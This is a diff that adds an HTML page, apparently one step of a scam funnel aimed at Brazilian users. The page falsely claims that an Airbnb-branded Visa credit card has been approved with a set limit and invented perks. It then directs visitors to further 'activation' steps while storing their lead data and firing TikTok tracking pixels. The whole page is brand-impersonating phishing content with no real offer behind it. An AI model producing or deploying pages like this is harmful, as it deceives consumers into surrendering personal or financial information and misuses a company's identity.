@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<script>
+  window.tikTokPixelId = "69edaaffbdf66cc14237f33f";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];
+  ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"];
+  ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};
+  for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);
+  ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e};
+  ttq.load=function(e,n){
+    var r="https://analytics.tiktok.com/i18n/pixel/events.js";
+    ttq._i=ttq._i||{};ttq._i[e]=[];ttq._i[e]._u=r;
+    ttq._t=ttq._t||{};ttq._t[e]=+new Date;
+    ttq._o=ttq._o||{};ttq._o[e]=n||{};
+    n=document.createElement("script");n.type="text/javascript";n.async=!0;
+    n.src=r+"?sdkid="+e+"&lib="+t;
+    e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)
+  };
+  ttq.load("D7MEITBC77U9TECL9BF0");
+  ttq.page();
+}(window, document, "ttq");
+</script>
+<!-- TikTok Pixel Code End -->
+
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Cartão Aprovado! — Airbnb</title>
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+        :root{--red:#FF385C;--red-dark:#E00B41;--black:#1A1A1A;--font:'Sora',-apple-system,sans-serif}
+        body{font-family:var(--font);background:var(--black);color:#fff;-webkit-font-smoothing:antialiased;min-height:100vh;overflow-x:hidden}
+        .page{max-width:520px;margin:0 auto;min-height:100vh;display:flex;flex-direction:column;position:relative;overflow:hidden}
+
+        canvas#confetti{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:100}
+
+        .glow{position:absolute;width:280px;height:280px;border-radius:50%;filter:blur(90px);opacity:.14;pointer-events:none}
+        .glow-1{background:var(--red);top:-80px;right:-80px;animation:g1 8s ease infinite}
+        .glow-2{background:#E00B41;bottom:80px;left:-80px;animation:g2 10s ease infinite}
+        @keyframes g1{0%,100%{transform:translate(0,0)}50%{transform:translate(-28px,20px)}}
+        @keyframes g2{0%,100%{transform:translate(0,0)}50%{transform:translate(20px,-28px)}}
+
+        /* HEADER */
+        .ap-header{padding:14px 20px;display:flex;align-items:center;justify-content:center;position:relative;z-index:10}
+        .badge-pill{display:flex;align-items:center;gap:6px;padding:6px 14px;background:rgba(52,199,89,.1);border:1px solid rgba(52,199,89,.2);border-radius:100px;font-size:.75rem;font-weight:700;color:#34C759}
+        .badge-dot{width:7px;height:7px;border-radius:50%;background:#34C759;animation:dp 2s ease infinite}
+        @keyframes dp{0%,100%{opacity:1}50%{opacity:.35}}
+
+        /* CARD SECTION */
+        .card-sec{padding:20px 20px 16px;text-align:center;position:relative;z-index:10}
+        .card-sec h1{font-size:1.5rem;font-weight:800;letter-spacing:-.02em;margin-bottom:4px;animation:fu .6s ease .3s both}
+        .card-sec .sub{font-size:.825rem;color:rgba(255,255,255,.5);animation:fu .6s ease .5s both}
+        @keyframes fu{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
+
+        /* 3D CARD */
+        .card-wrap{perspective:1000px;padding:16px 20px;animation:fu .6s ease .7s both;position:relative;z-index:10}
+        .card-3d{width:min(300px,82vw);height:190px;margin:0 auto;position:relative;border-radius:18px;overflow:hidden;transform-style:preserve-3d;transition:transform .3s;cursor:pointer;animation:cardFloat 4s ease-in-out infinite}
+        .card-3d:hover{animation:none;transform:rotateY(-6deg) rotateX(3deg)}
+        @keyframes cardFloat{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
+        .card-bg{position:absolute;inset:0;border-radius:18px;transition:background .5s;background:linear-gradient(145deg,#FF385C,#C8003C)}
+        .card-shine{position:absolute;inset:0;background:linear-gradient(105deg,transparent 40%,rgba(255,255,255,.14) 45%,rgba(255,255,255,.05) 50%,transparent 55%);border-radius:18px;animation:shine 3.5s ease-in-out infinite}
+        @keyframes shine{0%,100%{transform:translateX(-100%)}50%{transform:translateX(200%)}}
+        .card-inner{position:absolute;inset:0;padding:22px;display:flex;flex-direction:column;justify-content:space-between;z-index:2}
+        .card-logo svg{height:34px;fill:#fff}
+        .card-chip{position:absolute;right:22px;bottom:44px;font-size:26px;color:rgba(255,255,255,.62)}
+        .card-nm{font-size:.75rem;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,.78)}
+        .card-bot{display:flex;align-items:flex-end;justify-content:space-between}
+        .card-type{font-size:.62rem;color:rgba(255,255,255,.45);letter-spacing:.04em}
+        .card-brand{font-size:.82rem;font-weight:700;font-style:italic;color:rgba(255,255,255,.7)}
+
+        /* LIMIT */
+        .limit-sec{text-align:center;padding:0 20px 20px;animation:fu .6s ease .9s both;position:relative;z-index:10}
+        .l-label{font-size:.8rem;color:rgba(255,255,255,.45);margin-bottom:4px}
+        .l-val{font-size:2.2rem;font-weight:800;color:#34C759;letter-spacing:-.02em}
+        .l-val small{font-size:.95rem;font-weight:600}
+
+        /* BENEFITS */
+        .benefits{padding:0 20px 20px;display:flex;flex-direction:column;gap:10px;position:relative;z-index:10}
+        .ben{display:flex;align-items:center;gap:12px;padding:13px 15px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.07);border-radius:14px}
+        .ben:nth-child(1){animation:fu .5s ease 1s both}
+        .ben:nth-child(2){animation:fu .5s ease 1.1s both}
+        .ben:nth-child(3){animation:fu .5s ease 1.2s both}
+        .ben:nth-child(4){animation:fu .5s ease 1.3s both}
+        .ben-icon{width:40px;height:40px;border-radius:10px;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:17px}
+        .ben-text .bt{font-size:.85rem;font-weight:700;margin-bottom:2px}
+        .ben-text .bd{font-size:.73rem;color:rgba(255,255,255,.45)}
+
+        /* CTA */
+        .cta-sec{padding:14px 20px 36px;position:relative;z-index:10;animation:fu .5s ease 1.4s both}
+        .cta-btn{display:block;width:100%;padding:16px;border:none;border-radius:14px;font-size:.98rem;font-weight:700;cursor:pointer;font-family:var(--font);background:linear-gradient(135deg,var(--red),var(--red-dark));color:#fff;text-align:center;text-decoration:none;transition:.25s;box-shadow:0 6px 22px rgba(255,56,92,.3)}
+        .cta-btn:hover{filter:brightness(1.06);transform:translateY(-2px)}
+        .cta-note{text-align:center;font-size:.68rem;color:rgba(255,255,255,.28);margin-top:8px}
+    </style>
+</head>
+<body>
+<canvas id="confetti"></canvas>
+<div class="page">
+    <div class="glow glow-1"></div>
+    <div class="glow glow-2"></div>
+
+    <div class="ap-header">
+        <div class="badge-pill"><span class="badge-dot"></span> Pré-aprovado</div>
+    </div>
+
+    <div class="card-sec">
+        <h1>Parabéns, <span id="nameDisplay">Viajante</span>!</h1>
+        <p class="sub">Seu Cartão Airbnb foi aprovado com sucesso</p>
+    </div>
+
+    <div class="card-wrap">
+        <div class="card-3d" id="theCard">
+            <div class="card-bg"></div>
+            <div class="card-shine"></div>
+            <div class="card-inner">
+                <div>
+                    <svg class="card-logo" viewBox="0 0 1007 1080" fill="white"><path d="M949.278 666.715C875.957 506.859 795.615 344.664 713.713 184.809C698.893 155.177 670.813 98.2527 645.852 67.8412C609.971 24.1733 556.93 0.779785 503.109 0.779785C449.288 0.779785 396.247 24.1733 360.366 67.8412C335.406 98.2527 307.325 155.177 292.505 184.809C210.603 344.664 130.262 506.859 56.9404 666.715C47.5802 687.769 24.9598 737.675 16.3796 760.289C6.23941 787.581 0.779297 817.213 0.779297 846.845C0.779297 975.509 101.401 1079.22 235.564 1079.22C346.326 1079.22 434.468 1008.26 503.109 934.18C571.751 1008.26 659.892 1079.22 770.655 1079.22C904.817 1079.22 1006.22 975.509 1006.22 846.845C1006.22 817.213 999.979 787.581 989.839 760.289C981.259 737.675 958.638 687.769 949.278 666.715ZM503.109 810.195C447.728 738.455 396.247 649.56 396.247 577.819C396.247 506.079 446.948 470.209 503.109 470.209C559.27 470.209 610.751 508.419 610.751 577.819C610.751 647.22 558.49 738.455 503.109 810.195Z"/></svg>
+                </div>
+                <i class="fas fa-microchip card-chip"></i>
+                <div>
+                    <div class="card-nm" id="cardNm">SEU NOME</div>
+                    <div class="card-bot">
+                        <div class="card-type">Airbnb Gold · Visa</div>
+                        <div class="card-brand">VISA</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="limit-sec">
+        <div class="l-label">Limite disponível</div>
+        <div class="l-val"><small>R$</small> <span id="limiteDisplay">4.700</span><small>,00</small></div>
+    </div>
+
+    <div class="benefits">
+        <div class="ben">
+            <div class="ben-icon" style="background:rgba(52,199,89,.15);color:#34C759"><i class="fas fa-percent"></i></div>
+            <div class="ben-text"><div class="bt">5% de cashback</div><div class="bd">Em todas as reservas Airbnb nas primeiras 48h</div></div>
+        </div>
+        <div class="ben">
+            <div class="ben-icon" style="background:rgba(255,56,92,.15);color:#FF385C"><i class="fas fa-globe"></i></div>
+            <div class="ben-text"><div class="bt">Aceito em 220+ países</div><div class="bd">Compras internacionais sem taxas extras</div></div>
+        </div>
+        <div class="ben">
+            <div class="ben-icon" style="background:rgba(255,159,10,.15);color:#FF9F0A"><i class="fas fa-mobile-alt"></i></div>
+            <div class="ben-text"><div class="bt">Cartão virtual imediato</div><div class="bd">Disponível no app logo após a ativação</div></div>
+        </div>
+        <div class="ben">
+            <div class="ben-icon" style="background:rgba(175,82,222,.15);color:#AF52DE"><i class="fas fa-ban"></i></div>
+            <div class="ben-text"><div class="bt">Zero anuidade</div><div class="bd">Para sempre, sem condicional alguma</div></div>
+        </div>
+    </div>
+
+    <div class="cta-sec">
+        <a href="cep.html" class="cta-btn" id="ctaBtn"><i class="fas fa-arrow-right"></i> Ativar meu Cartão Airbnb</a>
+        <div class="cta-note">Faltam apenas mais alguns passos para ativar</div>
+    </div>
+</div>
+
+<script>
+    (function(){var u=['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'];var p=new URLSearchParams(window.location.search);u.forEach(function(k){var v=p.get(k);if(v)localStorage.setItem(k,v);});})();
+    const LeadData={_k:'airbnb_lead',load(){try{return JSON.parse(localStorage.getItem(this._k)||'{}')}catch{return{}}},update(d){const c=this.load();const u={...c,...d,updated_at:Date.now()};localStorage.setItem(this._k,JSON.stringify(u));return u}};
+    function buildUrl(base,extra={}){const url=new URL(base,window.location.href);new URLSearchParams(window.location.search).forEach((v,k)=>url.searchParams.set(k,v));Object.entries(extra).forEach(([k,v])=>{if(v)url.searchParams.set(k,v)});return url.toString();}
+
+    const data=LeadData.load();
+    const p=new URLSearchParams(window.location.search);
+    const limite=p.get('limite')||data.limite||4700;
+    const nome=data.nome||'Viajante';
+
+    // Name display
+    const fn=nome.split(' ')[0];
+    document.getElementById('nameDisplay').textContent=fn;
+    const nm=nome.split(' ')[0]+(nome.split(' ')[1]?' '+nome.split(' ')[1][0]+'.':'');
+    document.getElementById('cardNm').textContent=nm.toUpperCase();
+
+    // Format number
+    document.getElementById('limiteDisplay').textContent=Number(limite).toLocaleString('pt-BR');
+    LeadData.update({aprovado:true,limite,page:'aprovado'});
+
+    // CTA
+    document.getElementById('ctaBtn').addEventListener('click',function(e){
+        e.preventDefault();
+        window.location.href=buildUrl('cep.html',{limite});
+    });
+
+    // Confetti
+    const canvas=document.getElementById('confetti');
+    const ctx=canvas.getContext('2d');
+    canvas.width=window.innerWidth;canvas.height=window.innerHeight;
+    const pieces=[];const colors=['#FF385C','#E00B41','#FF6B6B','#fff','#FFD93D','#C8003C'];
+    for(let i=0;i<120;i++)pieces.push({x:Math.random()*canvas.width,y:Math.random()*canvas.height-canvas.height,w:Math.random()*8+4,h:Math.random()*4+2,r:Math.random()*Math.PI*2,dr:Math.random()*.1-.05,speed:Math.random()*3+2,color:colors[Math.floor(Math.random()*colors.length)],alpha:1});
+    let frame=0;
+    function draw(){
+        ctx.clearRect(0,0,canvas.width,canvas.height);
+        pieces.forEach(p=>{
+            ctx.save();ctx.translate(p.x,p.y);ctx.rotate(p.r);ctx.globalAlpha=p.alpha;
+            ctx.fillStyle=p.color;ctx.fillRect(-p.w/2,-p.h/2,p.w,p.h);ctx.restore();
+            p.y+=p.speed;p.r+=p.dr;p.x+=Math.sin(p.r)*.5;
+            if(p.y>canvas.height){p.y=-10;p.x=Math.random()*canvas.width;}
+            if(frame>180)p.alpha=Math.max(0,p.alpha-.005);
+        });
+        frame++;
+        if(frame<300)requestAnimationFrame(draw);else ctx.clearRect(0,0,canvas.width,canvas.height);
+    }
+    setTimeout(draw,300);
+</script>
+</body>
+</html>
